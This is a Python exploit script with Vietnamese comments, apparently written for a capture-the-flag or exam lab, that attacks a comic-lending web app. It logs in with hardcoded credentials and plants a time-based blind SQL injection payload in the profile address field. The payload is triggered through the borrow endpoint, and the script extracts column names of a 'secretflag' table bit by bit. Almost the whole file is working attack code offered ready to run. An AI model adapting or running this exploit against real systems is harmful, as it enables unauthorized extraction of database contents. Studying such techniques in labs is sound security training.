import string
import time
import urllib.parse
import requests

# ==================== CONFIGURATION ====================
BASE_URL = "https://kobos-087f8634.exam.cyberjutsu-lab.tech/"
USERNAME = "nghiaqt"
PASSWORD = "NghiaNgu_0123"
CHAPTER_ID_TO_BORROW = "2"
SLEEP_TIME = 5
TARGET_TABLE = "secretflag"
# =======================================================

s = requests.Session()

def login():
    print("[*] Đang đăng nhập...")
    login_url = f"{BASE_URL}/api/login"
    credentials = {"username": USERNAME, "password": PASSWORD}
    try:
        r = s.post(login_url, json=credentials, timeout=10)
        r.raise_for_status()
        token = r.json().get("token")
        if not token:
            print("[-] Không tìm thấy token.")
            exit(1)
        s.headers.update({"Authorization": f"Bearer {token}"})
        print("[+] Đăng nhập thành công.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Lỗi đăng nhập: {e}")
        exit(1)

def return_chapter():
    return_url = f"{BASE_URL}/api/comics/return"
    return_data = {
        "chapter_id": CHAPTER_ID_TO_BORROW,
        "feedback": "cleanup",
        "rating": 5,
        "platform_feedback": "automated cleanup"
    }
    try:
        s.post(return_url, json=return_data, timeout=10)
    except requests.exceptions.RequestException:
        pass

def check_condition(sql_condition):
    payload = f"' OR IF(({sql_condition}), sleep({SLEEP_TIME}), 0), '1234567890') -- "
    print(f"[DEBUG] SQL: {sql_condition}")
    encoded_payload = urllib.parse.quote_plus(payload)

    implant_url = f"{BASE_URL}/api/profile/info"
    implant_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    implant_data = f"address={encoded_payload}&telephone=12345&_method=PUT"
    try:
        s.post(implant_url, headers=implant_headers, data=implant_data, timeout=10)
    except requests.exceptions.RequestException:
        pass

    trigger_url = f"{BASE_URL}/api/comics/borrow"
    trigger_data = {"chapter_id": CHAPTER_ID_TO_BORROW}

    is_true = False
    start = time.time()
    try:
        s.post(trigger_url, json=trigger_data, timeout=SLEEP_TIME + 2)
    except requests.exceptions.Timeout:
        is_true = True
    except requests.exceptions.RequestException:
        pass
    end = time.time()

    if not is_true:
        is_true = (end - start) >= SLEEP_TIME

    return_chapter()
    return is_true

def extract_data(query_template):
    low, high = 1, 100
    while low <= high:
        mid = (low + high) // 2
        condition = query_template.format(f"> {mid}")
        if check_condition(condition):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract_string(query_template, length):
    result = ""
    for i in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            condition = query_template.format(i=i, char_code=f"<= {mid}")
            if check_condition(condition):
                high = mid - 1
            else:
                low = mid + 1

        found_char_code = low
        if 32 <= found_char_code <= 126:
            result += chr(found_char_code)
        else:
            print(f"\n[-] Không tìm thấy ký tự ở vị trí {i}.")
            result += "?"
    print(f"[!] Chuỗi đã trích xuất: {result}")
    return result

if __name__ == "__main__":
    login()
    print("[*] Dọn dẹp trạng thái trước...")
    return_chapter()

    print(f"\n--- Bước 1: Lấy số lượng cột trong bảng `{TARGET_TABLE}` ---")
    count_query = f"(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{TARGET_TABLE}' AND table_schema=database()) {{}}"
    col_count = extract_data(count_query)
    print(f"[+] Số lượng cột: {col_count}")

    all_columns = []
    print(f"\n--- Bước 2: Trích xuất tên {col_count} cột ---")
    for i in range(col_count):
        print(f"\n[+] Cột thứ {i+1}/{col_count}")
        len_query = f"(SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='{TARGET_TABLE}' AND table_schema=database() LIMIT {i},1) {{}}"
        col_len = extract_data(len_query)

        str_query = "(SELECT ASCII(SUBSTRING(column_name, {i}, 1)) FROM information_schema.columns WHERE table_name='" + TARGET_TABLE + f"' AND table_schema=database() LIMIT {i},1) {{char_code}}"
        col_name = extract_string(str_query, col_len)
        all_columns.append(col_name)

    print("\n=================== DANH SÁCH CỘT ===================")
    for name in all_columns:
        print(f"- {name}")
    print("=====================================================")
